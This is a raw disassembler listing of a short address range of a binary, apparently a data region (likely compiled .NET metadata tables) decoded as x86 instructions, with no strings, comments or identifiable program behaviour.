  407424:	b4 49                	mov    $0x49,%ah
  407426:	00 00                	add    %al,(%eax)
  407428:	00 00                	add    %al,(%eax)
  40742a:	16                   	push   %ss
  40742b:	00 1d 06 9f 00 24    	add    %bl,0x24009f06
  407431:	00 10                	add    %dl,(%eax)
  407433:	4a                   	dec    %edx
  407434:	00 00                	add    %al,(%eax)
  407436:	00 00                	add    %al,(%eax)
  407438:	11 00                	adc    %eax,(%eax)
  40743a:	21 06                	and    %eax,(%esi)
  40743c:	17                   	pop    %ss
  40743d:	01 24 00             	add    %esp,(%eax,%eax,1)
  407440:	e4 4a                	in     $0x4a,%al
  407442:	00 00                	add    %al,(%eax)
  407444:	00 00                	add    %al,(%eax)
  407446:	11 00                	adc    %eax,(%eax)
  407448:	33 06                	xor    (%esi),%eax
  40744a:	1e                   	push   %ds
  40744b:	01 26                	add    %esp,(%esi)
  40744d:	00 60 4b             	add    %ah,0x4b(%eax)
  407450:	00 00                	add    %al,(%eax)
  407452:	00 00                	add    %al,(%eax)
  407454:	11 08                	adc    %ecx,(%eax)
  407456:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407457:	16                   	push   %ss
  407458:	ea 00 27 00 70 4b 00 	ljmp   $0x4b,$0x70002700
  40745f:	00 00                	add    %al,(%eax)
  407461:	00 11                	add    %dl,(%ecx)
  407463:	08 b2 16 ea 00 28    	or     %dh,0x2800ea16(%edx)
  407469:	00 50 4c             	add    %dl,0x4c(%eax)
  40746c:	00 00                	add    %al,(%eax)
  40746e:	00 00                	add    %al,(%eax)
  407470:	06                   	push   %es
  407471:	18 4a 01             	sbb    %cl,0x1(%edx)
  407474:	13 00                	adc    (%eax),%eax
  407476:	29 00                	sub    %eax,(%eax)
  407478:	58                   	pop    %eax
  407479:	4c                   	dec    %esp
  40747a:	00 00                	add    %al,(%eax)
  40747c:	00 00                	add    %al,(%eax)
  40747e:	16                   	push   %ss
  40747f:	00 41 06             	add    %al,0x6(%ecx)
  407482:	24 01                	and    $0x1,%al
  407484:	29 00                	sub    %eax,(%eax)
  407486:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407487:	50                   	push   %eax
  407488:	00 00                	add    %al,(%eax)
  40748a:	00 00                	add    %al,(%eax)
  40748c:	06                   	push   %es
  40748d:	18 4a 01             	sbb    %cl,0x1(%edx)
  407490:	13 00                	adc    (%eax),%eax
  407492:	2c 00                	sub    $0x0,%al
  407494:	ac                   	lods   %ds:(%esi),%al
  407495:	50                   	push   %eax
  407496:	00 00                	add    %al,(%eax)
  407498:	00 00                	add    %al,(%eax)
  40749a:	16                   	push   %ss
  40749b:	00 5c 06 17          	add    %bl,0x17(%esi,%eax,1)
  40749f:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4074a2:	fc                   	cld
  4074a3:	50                   	push   %eax
  4074a4:	00 00                	add    %al,(%eax)
  4074a6:	00 00                	add    %al,(%eax)
  4074a8:	16                   	push   %ss
  4074a9:	00 65 06             	add    %ah,0x6(%ebp)
  4074ac:	17                   	pop    %ss
  4074ad:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4074b0:	34 51                	xor    $0x51,%al
  4074b2:	00 00                	add    %al,(%eax)
  4074b4:	00 00                	add    %al,(%eax)
  4074b6:	11 00                	adc    %eax,(%eax)
  4074b8:	6d                   	insl   (%dx),%es:(%edi)
  4074b9:	06                   	push   %es
  4074ba:	17                   	pop    %ss
  4074bb:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4074be:	2c 5a                	sub    $0x5a,%al
  4074c0:	00 00                	add    %al,(%eax)
  4074c2:	00 00                	add    %al,(%eax)
  4074c4:	11 18                	adc    %ebx,(%eax)
  4074c6:	85 01                	test   %eax,(%ecx)
  4074c8:	17                   	pop    %ss
  4074c9:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4074cc:	50                   	push   %eax
  4074cd:	5a                   	pop    %edx
  4074ce:	00 00                	add    %al,(%eax)
  4074d0:	00 00                	add    %al,(%eax)
  4074d2:	06                   	push   %es
  4074d3:	18 4a 01             	sbb    %cl,0x1(%edx)
  4074d6:	13 00                	adc    (%eax),%eax
  4074d8:	2c 00                	sub    $0x0,%al
  4074da:	58                   	pop    %eax
  4074db:	5a                   	pop    %edx
  4074dc:	00 00                	add    %al,(%eax)
  4074de:	00 00                	add    %al,(%eax)
  4074e0:	16                   	push   %ss
  4074e1:	00 8e 06 17 00 2c    	add    %cl,0x2c001706(%esi)
  4074e7:	00 70 5a             	add    %dh,0x5a(%eax)
  4074ea:	00 00                	add    %al,(%eax)
  4074ec:	00 00                	add    %al,(%eax)
  4074ee:	11 00                	adc    %eax,(%eax)
  4074f0:	94                   	xchg   %eax,%esp
  4074f1:	06                   	push   %es
  4074f2:	2c 01                	sub    $0x1,%al
  4074f4:	2c 00                	sub    $0x0,%al
  4074f6:	bc 5a 00 00 00       	mov    $0x5a,%esp
  4074fb:	00 11                	add    %dl,(%ecx)
  4074fd:	00 a1 06 32 01 2d    	add    %ah,0x2d013206(%ecx)
  407503:	00 b4 5d 00 00 00 00 	add    %dh,0x0(%ebp,%ebx,2)
  40750a:	11 00                	adc    %eax,(%eax)
  40750c:	c2 06 39             	ret    $0x3906
  40750f:	01 30                	add    %esi,(%eax)
  407511:	00 5c 5e 00          	add    %bl,0x0(%esi,%ebx,2)
  407515:	00 00                	add    %al,(%eax)
  407517:	00 11                	add    %dl,(%ecx)
  407519:	00 d8                	add    %bl,%al
  40751b:	06                   	push   %es
  40751c:	d5 00                	aad    $0x0
  40751e:	31 00                	xor    %eax,(%eax)
  407520:	00 00                	add    %al,(%eax)
  407522:	00 00                	add    %al,(%eax)
  407524:	80 00 11             	addb   $0x11,(%eax)
  407527:	20 06                	and    %al,(%esi)
  407529:	07                   	pop    %es
  40752a:	47                   	inc    %edi
  40752b:	01 31                	add    %esi,(%ecx)
  40752d:	00 00                	add    %al,(%eax)
  40752f:	00 00                	add    %al,(%eax)
  407531:	00 80 00 11 20 33    	add    %al,0x33201100(%eax)
  407537:	07                   	pop    %es
  407538:	50                   	push   %eax
  407539:	01 35 00 00 00 00    	add    %esi,0x0
  40753f:	00 80 00 11 20 4b    	add    %al,0x4b201100(%eax)
  407545:	07                   	pop    %es
  407546:	55                   	push   %ebp
  407547:	01 36                	add    %esi,(%esi)
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 00                	add    %al,(%eax)
  40754d:	00 80 00 11 20 75    	add    %al,0x75201100(%eax)
  407553:	03 a3 00 3a 00 00    	add    0x3a00(%ebx),%esp
  407559:	00 00                	add    %al,(%eax)
  40755b:	00 80 00 11 20 67    	add    %al,0x67201100(%eax)
  407561:	07                   	pop    %es
  407562:	5d                   	pop    %ebp
  407563:	01 3b                	add    %edi,(%ebx)
  407565:	00 00                	add    %al,(%eax)
  407567:	00 00                	add    %al,(%eax)
  407569:	00 80 00 11 20 7b    	add    %al,0x7b201100(%eax)
  40756f:	07                   	pop    %es
  407570:	61                   	popa
  407571:	01 3b                	add    %edi,(%ebx)
  407573:	00 00                	add    %al,(%eax)
  407575:	00 00                	add    %al,(%eax)
  407577:	00 80 00 11 20 a7    	add    %al,-0x58dfef00(%eax)
  40757d:	07                   	pop    %es
  40757e:	68 01 3d 00 00       	push   $0x3d01
  407583:	00 00                	add    %al,(%eax)
  407585:	00 80 00 11 20 bb    	add    %al,-0x44dfef00(%eax)
  40758b:	07                   	pop    %es
  40758c:	6d                   	insl   (%dx),%es:(%edi)
  40758d:	01 3e                	add    %edi,(%esi)
  40758f:	00 00                	add    %al,(%eax)
  407591:	00 00                	add    %al,(%eax)
  407593:	00 80 00 11 20 d7    	add    %al,-0x28dfef00(%eax)
  407599:	07                   	pop    %es
  40759a:	73 01                	jae    0x40759d
  40759c:	3f                   	aas
  40759d:	00 00                	add    %al,(%eax)
  40759f:	00 00                	add    %al,(%eax)
  4075a1:	00 80 00 11 20 0c    	add    %al,0xc201100(%eax)
  4075a7:	08 78 01             	or     %bh,0x1(%eax)
  4075aa:	40                   	inc    %eax
  4075ab:	00 00                	add    %al,(%eax)
  4075ad:	00 00                	add    %al,(%eax)
  4075af:	00 80 00 11 20 49    	add    %al,0x49201100(%eax)
  4075b5:	08 85 01 47 00 10    	or     %al,0x10004701(%ebp)
  4075bb:	5f                   	pop    %edi
  4075bc:	00 00                	add    %al,(%eax)
  4075be:	00 00                	add    %al,(%eax)
  4075c0:	06                   	push   %es
  4075c1:	18 4a 01             	sbb    %cl,0x1(%edx)
  4075c4:	13 00                	adc    (%eax),%eax
  4075c6:	49                   	dec    %ecx
  4075c7:	00 00                	add    %al,(%eax)
  4075c9:	00 00                	add    %al,(%eax)
  4075cb:	00 80 00 16 20 66    	add    %al,0x66201600(%eax)
  4075d1:	08 8b 01 49 00 18    	or     %cl,0x18004901(%ebx)
  4075d7:	5f                   	pop    %edi
  4075d8:	00 00                	add    %al,(%eax)
  4075da:	00 00                	add    %al,(%eax)
  4075dc:	16                   	push   %ss
  4075dd:	00 dc                	add    %bl,%ah
  4075df:	08 93 01 4c 00 20    	or     %dl,0x20004c01(%ebx)
  4075e5:	5f                   	pop    %edi
  4075e6:	00 00                	add    %al,(%eax)
  4075e8:	00 00                	add    %al,(%eax)
  4075ea:	16                   	push   %ss
  4075eb:	00 00                	add    %al,(%eax)
  4075ed:	09 17                	or     %edx,(%edi)
  4075ef:	00 4e 00             	add    %cl,0x0(%esi)
  4075f2:	6c                   	insb   (%dx),%es:(%edi)
  4075f3:	5f                   	pop    %edi
  4075f4:	00 00                	add    %al,(%eax)
  4075f6:	00 00                	add    %al,(%eax)
  4075f8:	16                   	push   %ss
  4075f9:	00 17                	add    %dl,(%edi)
  4075fb:	09 17                	or     %edx,(%edi)
  4075fd:	00 4e 00             	add    %cl,0x0(%esi)
  407600:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407601:	5f                   	pop    %edi
  407602:	00 00                	add    %al,(%eax)
  407604:	00 00                	add    %al,(%eax)
  407606:	06                   	push   %es
  407607:	18 4a 01             	sbb    %cl,0x1(%edx)
  40760a:	13 00                	adc    (%eax),%eax
  40760c:	4e                   	dec    %esi
  40760d:	00 ac 5f 00 00 00 00 	add    %ch,0x0(%edi,%ebx,2)
  407614:	16                   	push   %ss
  407615:	00 31                	add    %dh,(%ecx)
  407617:	09 cc                	or     %ecx,%esp
  407619:	00 4e 00             	add    %cl,0x0(%esi)
  40761c:	38 60 00             	cmp    %ah,0x0(%eax)
  40761f:	00 00                	add    %al,(%eax)
  407621:	00 11                	add    %dl,(%ecx)
  407623:	18 85 01 17 00 4f    	sbb    %al,0x4f001701(%ebp)
  407629:	00 00                	add    %al,(%eax)
  40762b:	00 00                	add    %al,(%eax)
  40762d:	00 80 00 16 20 4a    	add    %al,0x4a201600(%eax)
  407633:	09 9a 01 4f 00 bc    	or     %ebx,-0x43ffb0ff(%edx)
  407639:	60                   	pusha
  40763a:	00 00                	add    %al,(%eax)
  40763c:	00 00                	add    %al,(%eax)
  40763e:	16                   	push   %ss
  40763f:	00 6b 09             	add    %ch,0x9(%ebx)
  407642:	9f                   	lahf
  407643:	01 50 00             	add    %edx,0x0(%eax)
  407646:	dc 60 00             	fsubl  0x0(%eax)
  407649:	00 00                	add    %al,(%eax)
  40764b:	00 16                	add    %dl,(%esi)
  40764d:	00 b3 09 e1 01 51    	add    %dh,0x5101e109(%ebx)
  407653:	00 00                	add    %al,(%eax)
  407655:	00 00                	add    %al,(%eax)
  407657:	00 80 00 16 20 ca    	add    %al,-0x35dfea00(%eax)
  40765d:	09 e6                	or     %esp,%esi
  40765f:	01 52 00             	add    %edx,0x0(%edx)
  407662:	30 61 00             	xor    %ah,0x0(%ecx)
  407665:	00 00                	add    %al,(%eax)
  407667:	00 16                	add    %dl,(%esi)
  407669:	00 f6                	add    %dh,%dh
  40766b:	09 f1                	or     %esi,%ecx
  40766d:	01 53 00             	add    %edx,0x0(%ebx)
  407670:	ac                   	lods   %ds:(%esi),%al
  407671:	61                   	popa
  407672:	00 00                	add    %al,(%eax)
  407674:	00 00                	add    %al,(%eax)
  407676:	16                   	push   %ss
  407677:	00 34 0a             	add    %dh,(%edx,%ecx,1)
  40767a:	d1 00                	roll   $1,(%eax)
  40767c:	53                   	push   %ebx
  40767d:	00 00                	add    %al,(%eax)
  40767f:	00 00                	add    %al,(%eax)
  407681:	00 80 00 16 20 67    	add    %al,0x67201600(%eax)
  407687:	07                   	pop    %es
  407688:	5d                   	pop    %ebp
  407689:	01 53 00             	add    %edx,0x0(%ebx)
  40768c:	00 00                	add    %al,(%eax)
  40768e:	00 00                	add    %al,(%eax)
  407690:	80 00 16             	addb   $0x16,(%eax)
  407693:	20 47 0a             	and    %al,0xa(%edi)
  407696:	f9                   	stc
  407697:	01 53 00             	add    %edx,0x0(%ebx)
  40769a:	00 00                	add    %al,(%eax)
  40769c:	00 00                	add    %al,(%eax)
  40769e:	80 00 16             	addb   $0x16,(%eax)
  4076a1:	20 60 0a             	and    %ah,0xa(%eax)
  4076a4:	01 02                	add    %eax,(%edx)
  4076a6:	56                   	push   %esi
  4076a7:	00 08                	add    %cl,(%eax)
  4076a9:	62 00                	bound  %eax,(%eax)
  4076ab:	00 00                	add    %al,(%eax)
  4076ad:	00 16                	add    %dl,(%esi)
  4076af:	00 80 0a 17 00 57    	add    %al,0x5700170a(%eax)
  4076b5:	00 40 62             	add    %al,0x62(%eax)
  4076b8:	00 00                	add    %al,(%eax)
  4076ba:	00 00                	add    %al,(%eax)
  4076bc:	16                   	push   %ss
  4076bd:	00 d8                	add    %bl,%al
  4076bf:	06                   	push   %es
  4076c0:	d5 00                	aad    $0x0
  4076c2:	57                   	push   %edi
  4076c3:	00 a0 62 00 00 00    	add    %ah,0x62(%eax)
  4076c9:	00 16                	add    %dl,(%esi)
  4076cb:	00 8d 0a 08 02 57    	add    %cl,0x5702080a(%ebp)
  4076d1:	00 bc 62 00 00 00 00 	add    %bh,0x0(%edx,%eiz,2)
  4076d8:	16                   	push   %ss
  4076d9:	00 92 0a 0e 02 58    	add    %dl,0x58020e0a(%edx)
  4076df:	00 d8                	add    %bl,%al
  4076e1:	62 00                	bound  %eax,(%eax)
  4076e3:	00 00                	add    %al,(%eax)
  4076e5:	00 16                	add    %dl,(%esi)
  4076e7:	00 95 0a d5 00 59    	add    %dl,0x5900d50a(%ebp)
  4076ed:	00 68 63             	add    %ch,0x63(%eax)
  4076f0:	00 00                	add    %al,(%eax)
  4076f2:	00 00                	add    %al,(%eax)
  4076f4:	16                   	push   %ss
  4076f5:	00 98 0a 14 02 59    	add    %bl,0x5902140a(%eax)
  4076fb:	00 dc                	add    %bl,%ah
  4076fd:	63 00                	arpl   %eax,(%eax)
  4076ff:	00 00                	add    %al,(%eax)
  407701:	00 16                	add    %dl,(%esi)
  407703:	00 ab 0a 19 02 5a    	add    %ch,0x5a02190a(%ebx)
  407709:	00 44 64 00          	add    %al,0x0(%esp,%eiz,2)
  40770d:	00 00                	add    %al,(%eax)
  40770f:	00 16                	add    %dl,(%esi)
  407711:	00 ba 0a 08 02 5c    	add    %bh,0x5c02080a(%edx)
  407717:	00 b4 64 00 00 00 00 	add    %dh,0x0(%esp,%eiz,2)
  40771e:	16                   	push   %ss
  40771f:	00 c3                	add    %al,%bl
  407721:	0a 20                	or     (%eax),%ah
  407723:	02 5d 00             	add    0x0(%ebp),%bl
  407726:	54                   	push   %esp
  407727:	66 00 00             	data16 add %al,(%eax)
  40772a:	00 00                	add    %al,(%eax)
  40772c:	16                   	push   %ss
  40772d:	00 ce                	add    %cl,%dh
  40772f:	0a 20                	or     (%eax),%ah
  407731:	02 5e 00             	add    0x0(%esi),%bl
  407734:	e4 67                	in     $0x67,%al
  407736:	00 00                	add    %al,(%eax)
  407738:	00 00                	add    %al,(%eax)
  40773a:	16                   	push   %ss
  40773b:	00 d7                	add    %dl,%bh
  40773d:	0a 20                	or     (%eax),%ah
  40773f:	02 5f 00             	add    0x0(%edi),%bl
  407742:	58                   	pop    %eax
  407743:	68 00 00 00 00       	push   $0x0
  407748:	16                   	push   %ss
  407749:	00 e5                	add    %ah,%ch
  40774b:	0a 20                	or     (%eax),%ah
  40774d:	02 60 00             	add    0x0(%eax),%ah
  407750:	cc                   	int3
  407751:	68 00 00 00 00       	push   $0x0
  407756:	16                   	push   %ss
  407757:	00 fd                	add    %bh,%ch
  407759:	0a 9f 00 61 00 f0    	or     -0xfff9f00(%edi),%bl
  40775f:	68 00 00 00 00       	push   $0x0
  407764:	16                   	push   %ss
  407765:	00 09                	add    %cl,(%ecx)
  407767:	0b 17                	or     (%edi),%edx
  407769:	00 61 00             	add    %ah,0x0(%ecx)
  40776c:	00 00                	add    %al,(%eax)
  40776e:	00 00                	add    %al,(%eax)
  407770:	03 00                	add    (%eax),%eax
  407772:	06                   	push   %es
  407773:	18 4a 01             	sbb    %cl,0x1(%edx)
  407776:	2b 02                	sub    (%edx),%eax
  407778:	61                   	popa
  407779:	00 00                	add    %al,(%eax)
  40777b:	00 00                	add    %al,(%eax)
  40777d:	00 03                	add    %al,(%ebx)
  40777f:	00 46 03             	add    %al,0x3(%esi)
  407782:	4e                   	dec    %esi
  407783:	0b 31                	or     (%ecx),%esi
  407785:	02 63 00             	add    0x0(%ebx),%ah
  407788:	00 00                	add    %al,(%eax)
  40778a:	00 00                	add    %al,(%eax)
  40778c:	03 00                	add    (%eax),%eax
  40778e:	46                   	inc    %esi
  40778f:	03 7e 0b             	add    0xb(%esi),%edi
  407792:	3c 02                	cmp    $0x2,%al
  407794:	68 00 00 00 00       	push   $0x0
  407799:	00 03                	add    %al,(%ebx)
  40779b:	00 46 03             	add    %al,0x3(%esi)
  40779e:	9c                   	pushf
  40779f:	0b 42 02             	or     0x2(%edx),%eax
  4077a2:	69 00 00 00 00 00    	imul   $0x0,(%eax),%eax
  4077a8:	03 00                	add    (%eax),%eax
  4077aa:	06                   	push   %es
  4077ab:	18 4a 01             	sbb    %cl,0x1(%edx)
  4077ae:	2b 02                	sub    (%edx),%eax
  4077b0:	6c                   	insb   (%dx),%es:(%edi)
  4077b1:	00 00                	add    %al,(%eax)
  4077b3:	00 00                	add    %al,(%eax)
  4077b5:	00 03                	add    %al,(%ebx)
  4077b7:	00 46 03             	add    %al,0x3(%esi)
  4077ba:	4e                   	dec    %esi
  4077bb:	0b c6                	or     %esi,%eax
  4077bd:	03 6e 00             	add    0x0(%esi),%ebp
  4077c0:	00 00                	add    %al,(%eax)
  4077c2:	00 00                	add    %al,(%eax)
  4077c4:	03 00                	add    (%eax),%eax
  4077c6:	46                   	inc    %esi
  4077c7:	03 7e 0b             	add    0xb(%esi),%edi
  4077ca:	ce                   	into
  4077cb:	03 70 00             	add    0x0(%eax),%esi
  4077ce:	00 00                	add    %al,(%eax)
  4077d0:	00 00                	add    %al,(%eax)
  4077d2:	03 00                	add    (%eax),%eax
  4077d4:	46                   	inc    %esi
  4077d5:	03 9c 0b 13 00 71 00 	add    0x710013(%ebx,%ecx,1),%ebx
  4077dc:	48                   	dec    %eax
  4077dd:	4c                   	dec    %esp
  4077de:	00 00                	add    %al,(%eax)
  4077e0:	00 00                	add    %al,(%eax)
  4077e2:	06                   	push   %es
  4077e3:	18 4a 01             	sbb    %cl,0x1(%edx)
  4077e6:	13 00                	adc    (%eax),%eax
  4077e8:	71 00                	jno    0x4077ea
  4077ea:	80 4b 00 00          	orb    $0x0,0x0(%ebx)
  4077ee:	00 00                	add    %al,(%eax)
  4077f0:	06                   	push   %es
  4077f1:	08 9a 16 13 00 71    	or     %bl,0x71001316(%edx)
  4077f7:	00 00                	add    %al,(%eax)
  4077f9:	00 01                	add    %al,(%ecx)
  4077fb:	00 46 02             	add    %al,0x2(%esi)
  4077fe:	00 00                	add    %al,(%eax)
  407800:	01 00                	add    %eax,(%eax)
  407802:	7f 02                	jg     0x407806
  407804:	00 00                	add    %al,(%eax)
  407806:	01 00                	add    %eax,(%eax)
  407808:	7f 02                	jg     0x40780c
  40780a:	00 00                	add    %al,(%eax)
  40780c:	01 00                	add    %eax,(%eax)
  40780e:	85 03                	test   %eax,(%ebx)
  407810:	00 00                	add    %al,(%eax)
  407812:	01 00                	add    %eax,(%eax)
  407814:	ad                   	lods   %ds:(%esi),%eax
  407815:	03 00                	add    (%eax),%eax
  407817:	00 02                	add    %al,(%edx)
  407819:	00 b6 03 00 00 01    	add    %dh,0x1000003(%esi)
  40781f:	00 93 04 00 00 01    	add    %dl,0x1000004(%ebx)
  407825:	00 dc                	add    %bl,%ah
  407827:	04 00                	add    $0x0,%al
  407829:	00 01                	add    %al,(%ecx)
  40782b:	00 e9                	add    %ch,%cl
  40782d:	04 00                	add    $0x0,%al
  40782f:	00 01                	add    %al,(%ecx)
  407831:	00 f0                	add    %dh,%al
  407833:	04 00                	add    $0x0,%al
  407835:	00 01                	add    %al,(%ecx)
  407837:	00 dc                	add    %bl,%ah
  407839:	04 00                	add    $0x0,%al
  40783b:	00 01                	add    %al,(%ecx)
  40783d:	00 10                	add    %dl,(%eax)
  40783f:	05 00 00 01 00       	add    $0x10000,%eax
  407844:	08 13                	or     %dl,(%ebx)
  407846:	00 00                	add    %al,(%eax)
  407848:	01 00                	add    %eax,(%eax)
  40784a:	08 13                	or     %dl,(%ebx)
  40784c:	00 00                	add    %al,(%eax)
  40784e:	01 00                	add    %eax,(%eax)
  407850:	e9 04 00 00 01       	jmp    0x1407859
  407855:	00 2d 05 00 00 01    	add    %ch,0x1000005
  40785b:	00 f0                	add    %dh,%al
  40785d:	04 00                	add    $0x0,%al
  40785f:	00 01                	add    %al,(%ecx)
  407861:	00 f0                	add    %dh,%al
  407863:	04 00                	add    $0x0,%al
  407865:	00 01                	add    %al,(%ecx)
  407867:	00 5d 05             	add    %bl,0x5(%ebp)
  40786a:	00 00                	add    %al,(%eax)
  40786c:	01 00                	add    %eax,(%eax)
  40786e:	6e                   	outsb  %ds:(%esi),(%dx)
  40786f:	05 00 00 01 00       	add    $0x10000,%eax
  407874:	7b 05                	jnp    0x40787b
  407876:	00 00                	add    %al,(%eax)
  407878:	02 00                	add    (%eax),%al
  40787a:	7f 05                	jg     0x407881
  40787c:	00 00                	add    %al,(%eax)
  40787e:	01 00                	add    %eax,(%eax)
  407880:	9e                   	sahf
  407881:	05 00 00 02 00       	add    $0x20000,%eax
  407886:	ad                   	lods   %ds:(%esi),%eax
  407887:	05 00 00 03 00       	add    $0x30000,%eax
  40788c:	b5 05                	mov    $0x5,%ch
  40788e:	00 00                	add    %al,(%eax)
  407890:	04 00                	add    $0x0,%al
  407892:	b7 05                	mov    $0x5,%bh
  407894:	00 00                	add    %al,(%eax)
  407896:	05 00 b9 05 00       	add    $0x5b900,%eax
  40789b:	00 06                	add    %al,(%esi)
  40789d:	00 c0                	add    %al,%al
  40789f:	05 00 00 07 00       	add    $0x70000,%eax
  4078a4:	c8 05 00 00          	enter  $0x5,$0x0
  4078a8:	08 00                	or     %al,(%eax)
  4078aa:	d3 05 00 00 01 00    	roll   %cl,0x10000
  4078b0:	f7 05 00 20 02 00 ff 	testl  $0x5ff,0x22000
  4078b7:	05 00 00 
  4078ba:	03 00                	add    (%eax),%eax
  4078bc:	08 06                	or     %al,(%esi)
  4078be:	00 20                	add    %ah,(%eax)
  4078c0:	04 00                	add    $0x0,%al
  4078c2:	0f 06                	clts
  4078c4:	00 00                	add    %al,(%eax)
  4078c6:	05 00 17 06 00       	add    $0x61700,%eax
  4078cb:	00 01                	add    %al,(%ecx)
  4078cd:	00 29                	add    %ch,(%ecx)
  4078cf:	06                   	push   %es
  4078d0:	00 00                	add    %al,(%eax)
  4078d2:	02 00                	add    (%eax),%al
  4078d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d5:	05 00 00 01 00       	add    $0x10000,%eax
  4078da:	3a 06                	cmp    (%esi),%al
  4078dc:	00 00                	add    %al,(%eax)
  4078de:	01 00                	add    %eax,(%eax)
  4078e0:	08 13                	or     %dl,(%ebx)
  4078e2:	00 00                	add    %al,(%eax)
  4078e4:	01 00                	add    %eax,(%eax)
  4078e6:	08 13                	or     %dl,(%ebx)
  4078e8:	00 00                	add    %al,(%eax)
  4078ea:	01 00                	add    %eax,(%eax)
  4078ec:	45                   	inc    %ebp
  4078ed:	06                   	push   %es
  4078ee:	00 00                	add    %al,(%eax)
  4078f0:	02 00                	add    (%eax),%al
  4078f2:	4e                   	dec    %esi
  4078f3:	06                   	push   %es
  4078f4:	00 00                	add    %al,(%eax)
  4078f6:	03 00                	add    (%eax),%eax
  4078f8:	2d 05 00 00 01       	sub    $0x1000005,%eax
  4078fd:	00 9c 06 00 00 01 00 	add    %bl,0x10000(%esi,%eax,1)
  407904:	ae                   	scas   %es:(%edi),%al
  407905:	06                   	push   %es
  407906:	00 00                	add    %al,(%eax)
  407908:	02 00                	add    (%eax),%al
  40790a:	b4 06                	mov    $0x6,%ah
  40790c:	00 00                	add    %al,(%eax)
  40790e:	03 00                	add    (%eax),%eax
  407910:	bb 06 00 00 01       	mov    $0x1000006,%ebx
  407915:	00 d1                	add    %dl,%cl
  407917:	06                   	push   %es
  407918:	00 00                	add    %al,(%eax)
  40791a:	01 00                	add    %eax,(%eax)
  40791c:	17                   	pop    %ss
  40791d:	07                   	pop    %es
  40791e:	00 00                	add    %al,(%eax)
  407920:	02 00                	add    (%eax),%al
  407922:	1e                   	push   %ds
  407923:	07                   	pop    %es
  407924:	00 00                	add    %al,(%eax)
  407926:	03 00                	add    (%eax),%eax
  407928:	23 07                	and    (%edi),%eax
  40792a:	00 00                	add    %al,(%eax)
  40792c:	04 00                	add    $0x0,%al
  40792e:	28 07                	sub    %al,(%edi)
  407930:	00 00                	add    %al,(%eax)
  407932:	01 00                	add    %eax,(%eax)
  407934:	47                   	inc    %edi
  407935:	07                   	pop    %es
  407936:	00 00                	add    %al,(%eax)
  407938:	01 00                	add    %eax,(%eax)
  40793a:	47                   	inc    %edi
  40793b:	07                   	pop    %es
  40793c:	00 00                	add    %al,(%eax)
  40793e:	02 00                	add    (%eax),%al
  407940:	ae                   	scas   %es:(%edi),%al
  407941:	06                   	push   %es
  407942:	00 00                	add    %al,(%eax)
  407944:	03 00                	add    (%eax),%eax
  407946:	b4 06                	mov    $0x6,%ah
  407948:	00 00                	add    %al,(%eax)
  40794a:	04 00                	add    $0x0,%al
  40794c:	bb 06 00 00 01       	mov    $0x1000006,%ebx
  407951:	00 85 03 00 00 01    	add    %al,0x1000003(%ebp)
  407957:	00 94 07 02 00 02 00 	add    %dl,0x20002(%edi,%eax,1)
  40795e:	99                   	cltd
  40795f:	07                   	pop    %es
  407960:	00 00                	add    %al,(%eax)
  407962:	01 00                	add    %eax,(%eax)
  407964:	b3 07                	mov    $0x7,%bl
  407966:	00 00                	add    %al,(%eax)
  407968:	01 00                	add    %eax,(%eax)
  40796a:	cc                   	int3
  40796b:	07                   	pop    %es
  40796c:	00 00                	add    %al,(%eax)
  40796e:	01 00                	add    %eax,(%eax)
  407970:	e9 07 00 00 01       	jmp    0x140797c
  407975:	00 18                	add    %bl,(%eax)
  407977:	08 00                	or     %al,(%eax)
  407979:	00 02                	add    %al,(%edx)
  40797b:	00 21                	add    %ah,(%ecx)
  40797d:	08 00                	or     %al,(%eax)
  40797f:	00 03                	add    %al,(%ebx)
  407981:	00 cc                	add    %cl,%ah
  407983:	07                   	pop    %es
  407984:	02 20                	add    (%eax),%ah
  407986:	04 00                	add    $0x0,%al
  407988:	2b 08                	sub    (%eax),%ecx
  40798a:	00 00                	add    %al,(%eax)
  40798c:	05 00 34 08 00       	add    $0x83400,%eax
  407991:	00 06                	add    %al,(%esi)
  407993:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  407996:	00 00                	add    %al,(%eax)
  407998:	07                   	pop    %es
  407999:	00 43 08             	add    %al,0x8(%ebx)
  40799c:	00 00                	add    %al,(%eax)
  40799e:	01 00                	add    %eax,(%eax)
  4079a0:	57                   	push   %edi
  4079a1:	08 00                	or     %al,(%eax)
  4079a3:	00 02                	add    %al,(%edx)
  4079a5:	00 5d 08             	add    %bl,0x8(%ebp)
  4079a8:	00 20                	add    %ah,(%eax)
  4079aa:	01 00                	add    %eax,(%eax)
  4079ac:	82 08 00             	orb    $0x0,(%eax)
  4079af:	20 02                	and    %al,(%edx)
  4079b1:	00 8d 08 00 20 03    	add    %cl,0x3200008(%ebp)
  4079b7:	00 9c 08 00 00 01 00 	add    %bl,0x10000(%eax,%ecx,1)
  4079be:	f7 08 00 00 02 00    	testl  $0x20000,(%eax)
  4079c4:	fe 08                	decb   (%eax)
  4079c6:	00 00                	add    %al,(%eax)
  4079c8:	01 00                	add    %eax,(%eax)
  4079ca:	39 09                	cmp    %ecx,(%ecx)
  4079cc:	00 00                	add    %al,(%eax)
  4079ce:	01 00                	add    %eax,(%eax)
  4079d0:	61                   	popa
  4079d1:	09 00                	or     %eax,(%eax)
  4079d3:	00 01                	add    %al,(%ecx)
  4079d5:	00 7d 09             	add    %bh,0x9(%ebp)
  4079d8:	00 00                	add    %al,(%eax)
  4079da:	01 00                	add    %eax,(%eax)
  4079dc:	c3                   	ret
  4079dd:	09 00                	or     %eax,(%eax)
  4079df:	00 01                	add    %al,(%ecx)
  4079e1:	00 db                	add    %bl,%bl
  4079e3:	09 00                	or     %eax,(%eax)
  4079e5:	00 01                	add    %al,(%ecx)
  4079e7:	00 94 07 00 00 02 00 	add    %dl,0x20000(%edi,%eax,1)
  4079ee:	55                   	push   %ebp
  4079ef:	0a 00                	or     (%eax),%al
  4079f1:	00 03                	add    %al,(%ebx)
  4079f3:	00 5a 0a             	add    %bl,0xa(%edx)
  4079f6:	00 00                	add    %al,(%eax)
  4079f8:	01 00                	add    %eax,(%eax)
  4079fa:	78 0a                	js     0x407a06
